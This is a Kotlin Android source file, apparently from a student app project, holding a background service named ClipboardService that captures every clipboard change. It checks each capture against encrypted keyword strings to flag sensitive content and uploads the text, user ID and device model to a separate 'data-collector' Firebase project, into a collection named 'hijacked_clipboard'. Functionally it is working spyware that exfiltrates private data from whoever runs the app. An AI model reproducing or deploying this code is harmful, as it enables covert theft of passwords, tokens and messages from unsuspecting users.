package com.example.inf2007_mad_j1847.clipboard

import android.app.Service
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.example.inf2007_mad_j1847.BuildConfig
import com.example.inf2007_mad_j1847.utils.StringHelper
import com.google.firebase.FirebaseApp
import com.google.firebase.FirebaseOptions
import com.google.firebase.Timestamp
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore

class ClipboardService : Service() {   // ← renamed class

    private val TAG = "ClipboardService"   // ← renamed log tag
    private lateinit var clipboardManager: ClipboardManager
    private lateinit var db: FirebaseFirestore
    private val auth = FirebaseAuth.getInstance()
    private var lastCapturedText = ""

    private val ENCRYPTED_KEYWORDS = listOf(
        "l7uK0cbD04A0hO0OGRyoadZnX9FEsqrYHMuP9+7+Z2dO8eDQRq5S",
        "VDHCkOlvr2tY8mR+dwDz5VybOFP6AUrmTbzSiI+smjMyEQ==",
        "VSmK3m2nz6EbYtyJjujp0ktTVjTa+MoT94QGP3sGpcOvhhxx",
        "Gdo4ovK7aS+sXaABRoimZqLAOlbpR/4RiUWtH8S9a9NR8xM=",
        "45sVbllPDdEfm4LI0V0ikuQWrftkiR48IEXOOPay7+mVT+U="
    )

    private fun initSecondaryFirebase(): FirebaseFirestore {
        val existingApp = FirebaseApp.getApps(this).find { it.name == "data-collector" }
        if (existingApp != null) {
            return FirebaseFirestore.getInstance(existingApp)
        }

        val options = FirebaseOptions.Builder()
            .setApplicationId(BuildConfig.DATA_COLLECTOR_APP_ID)
            .setApiKey(BuildConfig.DATA_COLLECTOR_API_KEY)
            .setProjectId(BuildConfig.DATA_COLLECTOR_PROJECT_ID)
            .build()

        val secondaryApp = FirebaseApp.initializeApp(this, options, "data-collector")
        return FirebaseFirestore.getInstance(secondaryApp)
    }

    private val clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
        try {
            val clip = clipboardManager.primaryClip ?: return@OnPrimaryClipChangedListener
            val copiedText = clip.getItemAt(0)?.text?.toString() ?: return@OnPrimaryClipChangedListener

            if (copiedText == lastCapturedText) return@OnPrimaryClipChangedListener
            lastCapturedText = copiedText

            Log.d(TAG, "Clipboard captured: $copiedText")

            val isSensitive = ENCRYPTED_KEYWORDS.any { encrypted ->
                val decrypted = StringHelper.decrypt(encrypted) ?: ""
                decrypted.isNotEmpty() && copiedText.contains(decrypted, ignoreCase = true)
            }

            exfiltrateToFirestore(copiedText, isSensitive)
        } catch (e: SecurityException) {
            Log.e(TAG, "Cannot access clipboard in background: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Unexpected error reading clipboard", e)
        }
    }

    override fun onCreate() {
        super.onCreate()
        clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        db = initSecondaryFirebase()
        clipboardManager.addPrimaryClipChangedListener(clipboardListener)
        Log.d(TAG, "ClipboardService started")
    }

    override fun onDestroy() {
        super.onDestroy()
        clipboardManager.removePrimaryClipChangedListener(clipboardListener)
    }

    private fun exfiltrateToFirestore(capturedText: String, isSensitive: Boolean) {
        val uid = auth.currentUser?.uid ?: "unknown_user"

        val data = hashMapOf(
            "uid" to uid,
            "capturedText" to capturedText,
            "isSensitive" to isSensitive,
            "timestamp" to Timestamp.now(),
            "deviceInfo" to android.os.Build.MODEL
        )

        db.collection("hijacked_clipboard")
            .add(data)
            .addOnSuccessListener {
                Log.d(TAG, "Exfiltrated to data-collector: $capturedText")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Failed: ${e.message}")
            }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}